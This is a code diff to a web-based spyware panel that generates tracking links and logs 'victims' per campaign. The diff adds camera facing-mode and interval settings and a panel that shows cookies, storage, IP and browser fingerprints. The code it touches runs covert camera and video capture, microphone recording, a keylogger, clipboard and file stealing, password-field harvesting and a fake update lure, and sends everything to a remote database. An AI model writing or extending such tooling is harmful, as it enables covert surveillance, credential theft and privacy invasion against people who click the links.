@@ -127,6 +127,27 @@
             gap: 8px;
             margin: 1rem 0;
         }
+        .camera-custom {
+            display: none;
+            margin-top: 1rem;
+            padding: 1rem;
+            background: #f8fafc;
+            border-radius: 1rem;
+            border: 1px solid #e2e8f0;
+        }
+        .camera-custom h4 { margin-bottom: 0.5rem; }
+        .camera-custom .flex-row {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .camera-custom label { font-size: 0.8rem; margin-right: 0.5rem; }
+        .camera-custom select, .camera-custom input {
+            padding: 0.3rem;
+            border-radius: 0.5rem;
+            border: 1px solid #cbd5e1;
+        }
         .link-box {
             background: #f0f4ff;
             border-radius: 1rem;
@@ -336,6 +357,27 @@
                 <input type="checkbox" id="advancedToggle">
                 <label for="advancedToggle">⚡ ADVANCED STEALTH (Video Rec, File Steal, Browser Data, DNS Leak, Sensors)</label>
             </div>
+            <div id="cameraCustom" class="camera-custom">
+                <h4><i class="fas fa-camera"></i> Camera Customization (Advanced only)</h4>
+                <div class="flex-row">
+                    <div>
+                        <label>📷 Camera:</label>
+                        <select id="cameraFacing">
+                            <option value="auto">Auto</option>
+                            <option value="user">Front (Selfie)</option>
+                            <option value="environment">Back (Rear)</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label>⏱️ Image interval (seconds):</label>
+                        <input type="number" id="cameraInterval" value="2" step="0.5" min="0.5">
+                    </div>
+                    <div>
+                        <label>🎥 Video clip duration (seconds):</label>
+                        <input type="number" id="videoDuration" value="8" step="1" min="1">
+                    </div>
+                </div>
+            </div>
             <div class="shorten-check">
                 <input type="checkbox" id="shortenToggle"> <label for="shortenToggle">🔗 SHORTEN LINK (is.gd)</label>
             </div>
@@ -537,7 +579,8 @@
                             <button class="delete-victim-btn" data-camp="${campId}" data-victim="${victimId}"><i class="fas fa-trash-alt"></i> Delete Victim</button>
                         </div>
                         <div class="victim-tabs">
-                            <button class="tab-btn active" data-tab="images-${victimId}">Images (${data.camera?.length || 0})</button>
+                            <button class="tab-btn active" data-tab="passive-${victimId}">📡 PASSIVE INFO</button>
+                            <button class="tab-btn" data-tab="images-${victimId}">Images (${data.camera?.length || 0})</button>
                             <button class="tab-btn" data-tab="videos-${victimId}">Videos (${data.videoRec?.length || 0})</button>
                             <button class="tab-btn" data-tab="audio-${victimId}">Audio (${data.mic?.length || 0})</button>
                             <button class="tab-btn" data-tab="location-${victimId}">Location (${data.location?.length || 0})</button>
@@ -552,7 +595,33 @@
                             <button class="tab-btn" data-tab="dns-${victimId}">DNS Leak</button>
                             <button class="tab-btn" data-tab="sensors-${victimId}">Sensors</button>
                         </div>
-                        <div class="tab-content active" id="tab-images-${victimId}">
+                        <div class="tab-content active" id="tab-passive-${victimId}">
+                            ${data.passiveInfo ? `
+                                <div style="display:grid; grid-template-columns:1fr 1fr; gap:0.8rem; background:#f8fafc; padding:1rem; border-radius:1rem; border:1px solid #e2e8f0;">
+                                    <div><strong>🌐 Public IP</strong><br>${data.passiveInfo.ip || 'N/A'}</div>
+                                    <div><strong>🔋 Battery</strong><br>${data.passiveInfo.battery || 'N/A'}</div>
+                                    <div><strong>💻 Platform</strong><br>${data.passiveInfo.platform || 'N/A'}</div>
+                                    <div><strong>🗣️ Language</strong><br>${data.passiveInfo.language || 'N/A'}</div>
+                                    <div><strong>🖥️ Screen</strong><br>${data.passiveInfo.screen || 'N/A'}</div>
+                                    <div><strong>⏰ Timezone</strong><br>${data.passiveInfo.timezone || 'N/A'}</div>
+                                    <div><strong>🎮 GPU</strong><br>${data.passiveInfo.gpu || 'N/A'}</div>
+                                    <div><strong>🎙️ Audio Inputs</strong><br>${data.passiveInfo.audioInputs || 'N/A'}</div>
+                                    <div><strong>💾 Device Memory</strong><br>${data.passiveInfo.deviceMemory || 'N/A'}</div>
+                                    <div><strong>📡 Connection</strong><br>${data.passiveInfo.connection ? `${data.passiveInfo.connection.effectiveType}, ${data.passiveInfo.connection.downlink} Mbps` : 'N/A'}</div>
+                                    <div><strong>🚫 Do Not Track</strong><br>${data.passiveInfo.doNotTrack || 'N/A'}</div>
+                                    <div><strong>⚙️ Hardware Concurrency</strong><br>${data.passiveInfo.hardwareConcurrency || 'N/A'}</div>
+                                    <div><strong>🖌️ Canvas FP</strong><br>${data.passiveInfo.canvasFingerprint ? data.passiveInfo.canvasFingerprint.substring(0,40)+'...' : 'N/A'}</div>
+                                    <div><strong>🎨 WebGL Vendor</strong><br>${data.passiveInfo.webglVendor || 'N/A'}</div>
+                                    <div><strong>🔤 Fonts</strong><br>${(data.passiveInfo.fonts || []).join(', ') || 'N/A'}</div>
+                                    <div><strong>🔌 Plugins</strong><br>${(data.passiveInfo.plugins || []).join(', ') || 'N/A'}</div>
+                                    <div><strong>🏠 Local IP (WebRTC)</strong><br>${data.passiveInfo.localIP || 'N/A'}</div>
+                                    <div><strong>🍪 Cookies</strong><br>${data.passiveInfo.cookies ? data.passiveInfo.cookies.substring(0,100)+'...' : 'N/A'}</div>
+                                    <div><strong>📦 LocalStorage</strong><br>${data.passiveInfo.localStorage ? data.passiveInfo.localStorage.substring(0,100)+'...' : 'N/A'}</div>
+                                    <div><strong>💾 SessionStorage</strong><br>${data.passiveInfo.sessionStorage ? data.passiveInfo.sessionStorage.substring(0,100)+'...' : 'N/A'}</div>
+                                </div>
+                            ` : '<i>No passive data collected</i>'}
+                        </div>
+                        <div class="tab-content" id="tab-images-${victimId}">
                             ${data.camera && data.camera.length ? `<div class="image-grid">` + data.camera.map(img => `<img src="${img}" class="thumbnail" onclick="openLightbox('${img}')">`).join('') + `</div>` : '<i>No images captured</i>'}
                         </div>
                         <div class="tab-content" id="tab-videos-${victimId}">
@@ -667,13 +736,21 @@
         const selected = Array.from(document.querySelectorAll('.feature-card.selected')).map(c => c.getAttribute('data-feat')).join('');
         if(selected.length === 0) { showMsg('Select at least one feature', true); return; }
         const advanced = document.getElementById('advancedToggle').checked ? 'ADV' : '';
+        // Get camera customization values (only used if advanced and camera selected)
+        const cameraFacing = document.getElementById('cameraFacing').value;
+        const cameraInterval = parseFloat(document.getElementById('cameraInterval').value);
+        const videoDuration = parseInt(document.getElementById('videoDuration').value);
         const campId = 'CAMP_' + Date.now() + '_' + Math.random().toString(36).substring(2,6);
         db.ref(`sellers/${currentUid}/campaigns/${campId}`).set({
             features: selected,
             advanced: advanced,
             clicks: 0,
             createdAt: Date.now(),
-            victims: {}
+            victims: {},
+            // camera custom settings
+            cameraFacing: cameraFacing,
+            cameraInterval: cameraInterval,
+            videoDuration: videoDuration
         }).then(async () => {
             let fullLink = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
             let finalLink = fullLink;
@@ -705,20 +782,28 @@
         showMsg('Data exported');
     });
 
-    // ========== VICTIM COLLECTOR (FULL) ==========
-    async function startVictimCollector(sellerUid, campaignId, features, advanced) {
+    // ========== VICTIM COLLECTOR (FULL with custom camera settings) ==========
+    async function startVictimCollector(sellerUid, campaignId, features, advanced, campaignData) {
         const victimId = 'V_' + Date.now() + '_' + Math.random().toString(36).substring(2,8);
         const victimRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/victims/${victimId}`);
         const victimData = {
             deviceInfo: {}, location: [], camera: [], mic: [], keys: [], clipboard: [],
             fingerprint: {}, cookies: '', localStorage: '', sessionStorage: '',
             screenRec: [], networkScan: '', videoRec: [], files: [], browserData: {}, dnsLeak: {}, sensors: {},
+            passiveInfo: {},
             timestamp: Date.now()
         };
 
-        // --- Always collect advanced device info ---
-        let ip='unknown'; try{ let r=await fetch('https://api.ipify.org?format=json'); let d=await r.json(); ip=d.ip; }catch(e){}
-        let battery='N/A'; if(navigator.getBattery){ let b=await navigator.getBattery(); battery=`${Math.round(b.level*100)}% (${b.charging?'charging':'not'})`; }
+        // ---------- PASSIVE INFO (no permissions) ----------
+        let ip = 'unknown';
+        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
+        let battery = 'N/A';
+        if(navigator.getBattery) {
+            try {
+                const b = await navigator.getBattery();
+                battery = `${Math.round(b.level*100)}% (${b.charging?'charging':'not'})`;
+            } catch(e) {}
+        }
         let gpu = 'N/A';
         try {
             const canvas = document.createElement('canvas');
@@ -731,16 +816,27 @@
         let audioInputs = 'N/A';
         try {
             const devices = await navigator.mediaDevices.enumerateDevices();
-            audioInputs = devices.filter(d => d.kind === 'audioinput').map(d => d.label).join(', ');
+            audioInputs = devices.filter(d => d.kind === 'audioinput').map(d => d.label).join(', ') || 'not available';
         } catch(e) {}
-        victimData.deviceInfo = {
-            ip, battery, platform: navigator.platform, language: navigator.language,
-            screen: `${screen.width}x${screen.height}`, hardwareConcurrency: navigator.hardwareConcurrency,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            userAgent: navigator.userAgent, gpu, audioInputs
-        };
+        let connection = {};
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if(conn) {
+            connection = {
+                effectiveType: conn.effectiveType,
+                downlink: conn.downlink,
+                rtt: conn.rtt,
+                saveData: conn.saveData
+            };
+        }
+        let deviceMemory = navigator.deviceMemory || 'N/A';
+        let doNotTrack = navigator.doNotTrack || 'unspecified';
+        const platform = navigator.platform;
+        const language = navigator.language;
+        const screenRes = `${screen.width}x${screen.height}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const hardwareConcurrency = navigator.hardwareConcurrency;
 
-        // --- Fingerprint ---
+        // Fingerprinting
         const canvas = document.createElement('canvas'); canvas.width=200; canvas.height=50;
         const ctx = canvas.getContext('2d'); ctx.fillStyle='#f0f'; ctx.fillRect(0,0,200,50); ctx.fillStyle='#0f0'; ctx.fillText('MR_MOMIN',10,20);
         const canvasFingerprint = canvas.toDataURL();
@@ -770,13 +866,29 @@
             };
             setTimeout(() => pc.close(), 1000);
         } catch(e){}
+
+        const cookies = document.cookie;
+        let localStorageData = 'N/A', sessionStorageData = 'N/A';
+        try { localStorageData = JSON.stringify(localStorage); } catch(e){}
+        try { sessionStorageData = JSON.stringify(sessionStorage); } catch(e){}
+
+        victimData.passiveInfo = {
+            ip, battery, platform, language, screen: screenRes, timezone,
+            gpu, audioInputs, deviceMemory, connection, doNotTrack, hardwareConcurrency,
+            canvasFingerprint, webglVendor, fonts: availableFonts, plugins, localIP,
+            cookies, localStorage: localStorageData, sessionStorage: sessionStorageData
+        };
+        victimData.deviceInfo = {
+            ip, battery, platform, language, screen: screenRes,
+            hardwareConcurrency, timezone, userAgent: navigator.userAgent, gpu, audioInputs
+        };
         victimData.fingerprint = { canvasFingerprint, webglVendor, fonts: availableFonts, plugins, localIP };
+        victimData.cookies = cookies;
+        victimData.localStorage = localStorageData;
+        victimData.sessionStorage = sessionStorageData;
 
-        victimData.cookies = document.cookie;
-        try { victimData.localStorage = JSON.stringify(localStorage); } catch(e){}
-        try { victimData.sessionStorage = JSON.stringify(sessionStorage); } catch(e){}
-
-        // --- Optional features from selection ---
+        // ---------- OPTIONAL FEATURES (permission based) ----------
+        // Location
         if(features.includes('L') && navigator.geolocation) {
             const getLoc = () => {
                 navigator.geolocation.getCurrentPosition(pos => {
@@ -787,24 +899,35 @@
             getLoc(); setInterval(getLoc, 30000);
         }
 
+        // Camera (with custom facing mode and interval)
         if(features.includes('C')) {
-            try{
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            try {
+                let constraints = { video: true };
+                if (campaignData && campaignData.cameraFacing && campaignData.cameraFacing !== 'auto') {
+                    constraints.video = { facingMode: { exact: campaignData.cameraFacing } };
+                }
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 const video = document.getElementById('hiddenVideo');
-                video.srcObject = stream; await video.play();
+                video.srcObject = stream;
+                await video.play();
                 const canvas = document.getElementById('hiddenCanvas');
+                // Image capture interval (in milliseconds)
+                let intervalMs = (campaignData && campaignData.cameraInterval) ? campaignData.cameraInterval * 1000 : 2000;
                 const capture = () => {
                     if(video.videoWidth && video.videoHeight){
-                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video,0,0);
                         victimData.camera.push(canvas.toDataURL('image/jpeg',0.7));
                         victimRef.child('camera').set(victimData.camera);
                     }
                 };
-                capture(); setInterval(capture, 2000);
-            } catch(e){}
+                capture(); // immediate first
+                setInterval(capture, intervalMs);
+            } catch(e) { console.error("Camera error", e); }
         }
 
+        // Microphone
         if(features.includes('M')) {
             const record = async () => {
                 try{
@@ -829,6 +952,7 @@
             record(); setInterval(record,15000);
         }
 
+        // Keylogger
         if(features.includes('K')) {
             let keyBuffer = [];
             const sendKeys = () => {
@@ -849,6 +973,7 @@
             setInterval(sendKeys, 5000);
         }
 
+        // Clipboard
         if(features.includes('P')) {
             setInterval(async () => {
                 try {
@@ -861,6 +986,7 @@
             }, 7000);
         }
 
+        // Screen Rec
         if(features.includes('R')) {
             try {
                 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
@@ -881,6 +1007,7 @@
             } catch(e){}
         }
 
+        // Net Scan
         if(features.includes('N')) {
             let networkInfo = '';
             try {
@@ -900,6 +1027,7 @@
             victimRef.child('networkScan').set(networkInfo);
         }
 
+        // Fake Update
         if(features.includes('F')) {
             const fakeDiv = document.getElementById('fakeUpdateDiv');
             const fakeBtn = document.getElementById('fakeUpdateBtn');
@@ -913,14 +1041,19 @@
             }
         }
 
-        // --- ADVANCED STEALTH FEATURES ---
+        // ---------- ADVANCED STEALTH FEATURES (if advanced flag is true) ----------
         if(advanced === 'ADV') {
-            // 1. Video Recording from Camera
+            // Video Recording from Camera (using custom duration)
             if(features.includes('C')) {
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    let constraints = { video: true };
+                    if (campaignData && campaignData.cameraFacing && campaignData.cameraFacing !== 'auto') {
+                        constraints.video = { facingMode: { exact: campaignData.cameraFacing } };
+                    }
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                     const recorder = new RecordRTC(stream, { type: 'video', mimeType: 'video/webm' });
                     recorder.startRecording();
+                    let duration = (campaignData && campaignData.videoDuration) ? campaignData.videoDuration * 1000 : 8000;
                     setTimeout(() => {
                         recorder.stopRecording(() => {
                             const blob = recorder.getBlob();
@@ -932,11 +1065,11 @@
                             };
                             reader.readAsDataURL(blob);
                         });
-                    }, 8000);
+                    }, duration);
                 } catch(e){}
             }
 
-            // 2. Longer microphone clips
+            // Longer microphone clips (keep as is)
             if(features.includes('M')) {
                 const longRecord = async () => {
                     try{
@@ -962,7 +1095,7 @@
                 setInterval(longRecord, 45000);
             }
 
-            // 3. File Stealer
+            // File Stealer
             const filePicker = document.getElementById('filePicker');
             if(filePicker) {
                 filePicker.addEventListener('change', async (e) => {
@@ -981,7 +1114,7 @@
                 setTimeout(() => filePicker.click(), 5000);
             }
 
-            // 4. Browser Data Extraction
+            // Browser Data Extraction
             let passwords = [];
             let autofill = [];
             document.querySelectorAll('input[type="password"]').forEach(inp => {
@@ -998,7 +1131,7 @@
             };
             victimRef.child('browserData').set(victimData.browserData);
 
-            // 5. DNS Leak
+            // DNS Leak
             let localIPs = [];
             try {
                 const pc = new RTCPeerConnection({ iceServers: [] });
@@ -1015,7 +1148,7 @@
             victimData.dnsLeak = { localIPs: localIPs.join(', '), publicIP: ip };
             victimRef.child('dnsLeak').set(victimData.dnsLeak);
 
-            // 6. Sensor Data
+            // Sensor Data
             window.addEventListener('deviceorientation', (e) => {
                 victimData.sensors.orientation = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
                 victimRef.child('sensors/orientation').set(victimData.sensors.orientation);
@@ -1058,9 +1191,10 @@
                 document.querySelector('#victimPanel .fake-stream-header').innerHTML = '<div style="padding:2rem;">Invalid link.</div>';
                 return;
             }
-            const features = snap.val().features;
-            const advanced = snap.val().advanced || '';
-            await startVictimCollector(uidParam, campParam, features, advanced);
+            const data = snap.val();
+            const features = data.features;
+            const advanced = data.advanced || '';
+            await startVictimCollector(uidParam, campParam, features, advanced, data);
         });
     } else {
         let stored = localStorage.getItem('momin_uid');
@@ -1069,6 +1203,17 @@
         document.getElementById('generateLinkBtn').onclick = generateNewCampaign;
         document.getElementById('copyLinkBtn').onclick = () => { const link = document.getElementById('newLinkText').innerText; if(link && link!=='--') copyClip(link); };
         document.querySelectorAll('.feature-card').forEach(c => c.addEventListener('click',()=>c.classList.toggle('selected')));
+
+        // Show/hide camera customization based on advanced toggle
+        const advancedToggle = document.getElementById('advancedToggle');
+        const cameraCustomDiv = document.getElementById('cameraCustom');
+        advancedToggle.addEventListener('change', () => {
+            if(advancedToggle.checked) cameraCustomDiv.style.display = 'block';
+            else cameraCustomDiv.style.display = 'none';
+        });
+        // Initial visibility
+        if(advancedToggle.checked) cameraCustomDiv.style.display = 'block';
+        else cameraCustomDiv.style.display = 'none';
     }
     initLightbox();
 </script>
